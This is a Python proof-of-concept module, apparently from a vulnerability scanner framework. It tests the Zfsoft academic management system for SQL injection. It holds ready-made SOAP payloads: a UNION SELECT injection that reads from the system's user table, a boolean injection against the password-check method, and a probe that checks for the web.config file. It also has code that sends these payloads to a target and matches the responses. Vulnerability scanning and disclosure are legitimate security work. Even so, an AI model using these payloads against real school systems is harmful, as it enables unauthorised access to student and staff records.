# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.parse
import http.client


class Vuln(ABVuln):
    vuln_id = 'Zfsoft_0001'  # 平台漏洞编号，留空
    name = '正方教务管理系统 SQL注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-06-24'  # 漏洞公布时间
    desc = '''
        正方现代教学管理系统是一个面向学院各部门以及各层次用户的多模块综合信息管理系，包括教务公共信息维护、学生管理、师资管理、教学计划管理、智能排课、考试管理、选课管理、成绩管理、教材管理、实践管理、收费管理、教学质量评价、毕业生管理、体育管理、实验室管理以及学生综合信息查询、教师网上成绩录入等模块，能够满足从学生入学到毕业全过程及教务管理各个环节的管理需要。系统采用了当前流行的C/S结构和Internet网络技术，使整个校园网甚至Internet上的用户都可访问该系统，最大程度地实现了数据共享，深受广大用户青睐。
        正方教务管理系统/file.asmx等文件设计缺陷导致SQL注入漏洞的产生。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0122523'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '正方教务管理系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ff9845e8-189b-4e24-97f0-fa4fa7bd7e77'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer:http://www.wooyun.org/bugs/wooyun-2010-0122523
            arr = urllib.parse.urlparse(self.target)
            hh = hackhttp.hackhttp()
            raw1 = '''
POST /service.asmx HTTP/1.1
Host: %s
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://www.zf_webservice.com/GetStuCheckinInfo "

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:tns="http://tempuri.org/" xmlns:types="http://tempuri.org/encodedTypes" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body soap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
    <q1:GetStuCheckinInfo xmlns:q1="http://www.zf_webservice.com/GetStuCheckinInfo">
      <xh xsi:type="xsd:string">222222' union select Null,'testvul',Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null from yhb where yhm='jwc01</xh>
      <xnxq xsi:type="xsd:string">2013-2014-1</xnxq>
      <strKey xsi:type="xsd:string">KKKGZ2312</strKey>
    </q1:GetStuCheckinInfo>
  </soap:Body>
</soap:Envelope>''' % arr.netloc
            raw2 = '''POST /file.asmx HTTP/1.1
Host: %s
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://zfsoft/zfjw/file/checkFile"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <checkFile xmlns="http://zfsoft/zfjw/file">
      <fileDir>./web.config</fileDir>
    </checkFile>
  </soap:Body>
</soap:Envelope>''' % arr.netloc
            raw3 = '''POST /service.asmx HTTP/1.1
Host: %s
Content-Type: text/xml; charset=utf-8
Content-Length: 795
SOAPAction: "http://www.zf_webservice.com/BMCheckPassword"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:tns="http://tempuri.org/" xmlns:types="http://tempuri.org/encodedTypes" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body soap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
    <q1:BMCheckPassword xmlns:q1="http://www.zf_webservice.com/BMCheckPassword">
      <strYHM xsi:type="xsd:string">jwc01'and 'a'='a</strYHM>
      <strPassword xsi:type="xsd:string">string</strPassword>
      <xh xsi:type="xsd:string">string</xh>
      <strKey xsi:type="xsd:string">KKKGZ2312</strKey>
    </q1:BMCheckPassword>
  </soap:Body>
</soap:Envelope>''' % arr.netloc

            url1 = self.target + '/service.asmx'
            url2 = self.target + '/file.asmx'
            url3 = self.target + '/service.asmx'
            code1, head1, res1, errcode1, _ = hh.http(url1, raw=raw1)
            code2, head2, res2, errcode2, _ = hh.http(url2, raw=raw2)
            code3, head3, res3, errcode3, _ = hh.http(url3, raw=raw3)
            if code1 == 200 and 'testvul' in res1:
                #security_hole("GetStuCheckinInfo injection  %s" % target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

            if code2 == 200 and '<checkFileResult>true</checkFileResult>' in res2:
                #security_hole("checkFile injection  %s" % target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

            if code3 == 200 and "type=\"xsd:int\">5</BMCheckPasswordResult><xh xsi:type=\"xsd:string\">jwc01</xh>" in res3:
                #security_hole('BMCheckPassword inject %s' % target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
